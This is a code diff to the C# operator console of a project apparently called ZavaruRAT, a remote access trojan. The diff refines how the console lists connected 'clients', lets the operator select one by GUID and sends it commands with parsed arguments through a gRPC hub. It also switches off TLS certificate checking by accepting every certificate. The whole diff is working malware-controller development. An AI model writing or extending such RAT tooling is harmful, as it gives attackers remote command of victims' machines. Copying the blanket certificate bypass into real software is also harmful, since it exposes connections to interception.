@@ -12,7 +12,13 @@ using ZavaruRAT.Proto;
 
 Console.OutputEncoding = Encoding.UTF8;
 
-var channel = GrpcChannel.ForAddress("https://localhost:5001");
+var httpHandler = new HttpClientHandler();
+httpHandler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
+var channel = GrpcChannel.ForAddress("https://127.0.0.1:13442", new GrpcChannelOptions
+{
+    Credentials = ChannelCredentials.SecureSsl,
+    HttpHandler = httpHandler
+});
 var adminClient = new AdminHub.AdminHubClient(channel);
 
 var commandHandlers = new List<CommandHandler>
@@ -22,6 +28,8 @@ var commandHandlers = new List<CommandHandler>
 
 async Task ExecuteClientCommand()
 {
+start:
+
     Console.Clear();
 
     var stats = await adminClient.NetworkStatisticsAsync(new Empty());
@@ -43,7 +51,9 @@ async Task ExecuteClientCommand()
     // wait until someone connects
     if (stats.Clients == 0)
     {
-        await Task.Delay(1000);
+        Console.WriteLine("No clients online");
+
+        await Task.Delay(2500);
         return;
     }
 
@@ -53,30 +63,50 @@ async Task ExecuteClientCommand()
         Console.Write("Client ID > ");
         clientId = Console.ReadLine()!;
 
-        if (Guid.TryParse(clientId, out _))
+        if (clientId == "@")
         {
-            break;
+            return;
         }
-    }
 
-    var clientExists = await adminClient.ClientExistsAsync(new ClientExistsRequest
-    {
-        ClientId = clientId
-    });
+        if (!Guid.TryParse(clientId, out _))
+        {
+            continue;
+        }
 
-    if (!clientExists.Exists)
-    {
-        Console.WriteLine("Client does not exist.");
-        Console.ReadKey();
-        return;
+        var clientExists = await adminClient.ClientExistsAsync(new ClientExistsRequest
+        {
+            ClientId = clientId
+        });
+
+        if (!clientExists.Exists)
+        {
+            Console.WriteLine("Client not found");
+            Console.WriteLine();
+
+            continue;
+        }
+
+        break;
     }
 
     Console.Write("Command   > ");
     var command = Console.ReadLine()!;
 
+    switch (command)
+    {
+        // wrong client
+        case "-":
+            goto start;
+        // go homie
+        case "@":
+            return;
+    }
+
     Console.WriteLine();
 
-    // todo: arguments
+    var split = command.Split(' ', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries);
+    var cmd = split[0];
+    var args = split.Length > 1 ? split[1..] : Array.Empty<string>();
 
     var hashId = Guid.NewGuid().ToString();
     var results = adminClient.CommandResults(new CommandResultsRequest
@@ -88,7 +118,11 @@ async Task ExecuteClientCommand()
     {
         ClientId = clientId,
         HashId = hashId,
-        Command = command
+        Command = cmd,
+        Arguments =
+        {
+            args
+        }
     });
 
     Console.WriteLine("Waiting for {0} result", hashId);
@@ -107,6 +141,12 @@ async Task ExecuteClientCommand()
 
     if (handled)
     {
+        Console.WriteLine();
+        Console.WriteLine();
+        Console.WriteLine("Press <ENTER> to continue");
+
+        Console.ReadLine();
+
         return;
     }
 
@@ -134,8 +174,9 @@ async Task ExecuteClientCommand()
 
     Console.WriteLine();
     Console.WriteLine();
-    Console.WriteLine();
-    Console.WriteLine();
+    Console.WriteLine("Press <ENTER> to continue.");
+
+    Console.ReadLine();
 }
 
 while (true)
@@ -157,8 +198,9 @@ while (true)
             await ExecuteClientCommand();
             break;
         case ConsoleKey.D2:
+            Environment.Exit(0);
             return;
     }
 
-    await Task.Delay(5000);
+    await Task.Delay(1000);
 }
